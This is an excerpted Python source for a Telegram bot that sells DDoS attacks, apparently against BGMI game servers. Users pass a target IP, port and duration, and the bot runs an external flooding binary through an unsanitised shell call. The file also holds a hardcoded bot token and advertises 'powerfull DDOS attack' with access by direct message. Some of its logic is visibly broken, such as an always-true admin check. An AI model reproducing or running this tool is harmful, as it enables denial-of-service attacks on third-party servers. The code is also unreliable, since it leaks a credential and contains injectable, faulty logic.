...
bot = telebot.TeleBot('7513753736:AAGCnNAnfyh9pW3HcPwRI2UQ4mS04EC64oo')
...
def add_user(message):
    ...
    if user_id in admin_ids or owner_id:
        ...
        response = "Only Admins or the Owner can run this command 😡."
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_ids and user_id != owner_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 100:
                response = "You Are On Cooldown ❌. Please Wait 100sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            ...
            if time > 300:
                ...
                full_command = f"./sid {target} {port} {time} 30"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. \nTarget: {target} \nPort: {port} \nPort: {time} OWNER:- @MR_SID_001"
        else:
...
3. MAKE SURE YOU JOINED @MR_SID_001 OTHERWISE NOT WORK
...
def send_welcome(message):
    ...
    #btn2 = telebot.types.KeyboardButton('💼 Attack ++')
   # btn3 = telebot.types.KeyboardButton('ℹ️ My Info')
    markup.add(btn1)
    bot.send_message(message.chat.id, "Welcome 😄\n Provide powerfull DDOS attack \n 27/7 available \n No cooldown \n Dm For Access :- @MR_SID_001", reply_markup=markup)
